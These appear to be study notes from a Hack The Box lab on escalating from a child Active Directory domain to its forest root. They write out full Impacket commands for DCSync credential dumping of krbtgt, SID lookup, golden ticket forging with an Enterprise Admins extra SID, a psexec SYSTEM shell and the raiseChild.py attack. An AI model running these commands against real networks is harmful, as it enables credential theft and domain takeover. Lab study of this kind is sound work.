- We need the same information
![](/attachments/Pasted-image-20250301191703.png)
### DCSync with secretsdump.py
- `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
### SID Brute forcing with lookupsid.py
- find SID of child domain
- `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
	- whatever is the IP we specify will be the target for SID lookup
	- Returns:
		- sid for domain
		- rid for each user
		- If RID = 1001, SID = S-1-5-21-2806153819-209893948-922872689-`1001`
- `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` 
	- only get SID
### Grab the Domain SID & Attach it to Enterprise Admins RID
- grab domain controllers SID and attach RID of Enterprise admin
- https://adsecurity.org/?p=1001 - well know SIDs
- `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
	- specify IP of DC
### Constructing a Golden Ticket using ticketer.py
- `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 haxer`
- saves ticket to `ccache` file
- `export KRB5CCNAME=haxer.ccache`
### Get a SYSTEM shell using psexec.py
- `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`
	- confirm if we can authenticate to the parent domain's DC using psexec
	- This will drop us into a shell

<hr>

## Impacket - raiseChild.py
- automates escalating from child to parent domain
- specify target DC and creds for an admin user in the child domain.
- ![](/attachments/Pasted-image-20250301194937.png)
### attack with raiseChild.py
- `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
	- `-target-exec` - authenticates to the parent domain's DC via PSExec
	- This will **dump** the `LM:NTLM` hash of the `INLANEFREIGHT.LOCAL/administrator` user for the shell we get
- We can use this hash to do **DCSync** on other users in this forest (INLANEFREIGHT)
- `secretsdump.py -just-dc-user bross INLANEFREIGHT.LOCAL/administrator@172.16.5.5 -hashes <LM:NTLM whole hash>`
	- specify the ip of the DC.
